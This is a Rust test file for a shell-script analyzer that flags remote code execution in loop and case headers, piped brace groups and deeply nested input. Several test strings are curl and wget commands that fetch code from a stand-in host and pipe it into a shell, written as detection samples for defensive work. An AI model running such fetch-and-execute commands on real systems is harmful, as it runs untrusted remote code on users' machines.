//! Places where code runs that aren't at command position: loop and `case`
//! headers, brace groups piped into a shell, and pathologically deep nesting.

use std::io::Write;
use std::process::{Command, Stdio};

use soothsay::{analyze, Category};

fn remote_exec(src: &str) -> bool {
    analyze(src)
        .findings
        .iter()
        .any(|f| f.reachable && f.category == Category::RemoteExec)
}

#[test]
fn for_header_substitution_is_analyzed() {
    assert!(remote_exec(
        "for x in $(curl -s https://e.x/p | sh); do :; done"
    ));
    assert!(remote_exec(
        "for x in a \"$(curl -s https://e.x/p | sh)\"\ndo\n  echo \"$x\"\ndone"
    ));
}

#[test]
fn select_header_substitution_is_analyzed() {
    assert!(remote_exec(
        "select x in $(curl -s https://e.x/p | sh); do break; done"
    ));
}

#[test]
fn case_header_substitution_is_analyzed() {
    assert!(remote_exec(
        "case $(curl -s https://e.x/p | sh) in *) ;; esac"
    ));
}

#[test]
fn case_pattern_substitution_is_analyzed() {
    assert!(remote_exec(
        "case x in\n  $(curl -s https://e.x/p | sh)) echo hi ;;\nesac"
    ));
}

#[test]
fn plain_loops_and_cases_stay_quiet() {
    let r = analyze(
        "for f in a b c; do echo \"$f\"; done\ncase \"$1\" in\n  -h|--help) echo usage ;;\n  *) echo ok ;;\nesac\n",
    );
    assert!(r.findings.is_empty(), "{:?}", r.findings);
}

#[test]
fn brace_group_piped_into_a_shell() {
    assert!(remote_exec("{ curl -s https://e.x/p; } | sh"));
    assert!(remote_exec(
        "{ echo set -e; curl -s https://e.x/p; } | bash"
    ));
    assert!(remote_exec("( curl -s https://e.x/p; ) | sh"));
    assert!(remote_exec("{ wget -qO- https://e.x/p; } 2>/dev/null | sh"));
}

#[test]
fn brace_group_not_piped_is_not_remote_exec() {
    assert!(!remote_exec(
        "{ curl -fsSL -o /tmp/x https://e.x/p; }\nsh -c 'echo hi'"
    ));
}

/// Run the CLI so a stack overflow (which aborts the process) fails the test
/// instead of taking the test harness down with it.
fn cli_exit(src: &str) -> i32 {
    let mut child = Command::new(env!("CARGO_BIN_EXE_soothsay"))
        .arg("--no-color")
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .unwrap();
    // The program may exit before reading stdin (e.g. a usage error); the
    // exit code is what's under test, so a closed pipe here isn't a failure.
    let _ = child.stdin.take().unwrap().write_all(src.as_bytes());
    child.wait().unwrap().code().unwrap_or(-1)
}

#[test]
fn deep_nesting_does_not_crash() {
    let n = 20_000;
    let cases = [
        format!("echo ${{{}x}}", "!".repeat(200_000)),
        format!("echo {}x{}", "${a:-".repeat(n), "}".repeat(n)),
        format!("echo \"{}x{}\"", "${a:-\"".repeat(n), "\"}".repeat(n)),
        format!("echo {}x{}", "$(".repeat(n), ")".repeat(n)),
        format!("echo {}1{}", "$((".repeat(n), "))".repeat(n)),
        format!("echo {}x{}", "\"$(".repeat(n), ")\"".repeat(n)),
        format!("echo {}x{}", "<(".repeat(n), ")".repeat(n)),
        format!("{}x{}", "{ ".repeat(n), "; }".repeat(n)),
        format!("{}x{}", "(".repeat(n), ")".repeat(n)),
        format!("echo {}", "`echo \\".repeat(n)),
        format!("for x in {}; do :; done", "$(".repeat(n)),
        format!("case {} in", "${a:-".repeat(n)),
    ];
    for (i, src) in cases.iter().enumerate() {
        assert_eq!(cli_exit(src), 0, "case {i} crashed");
    }
}
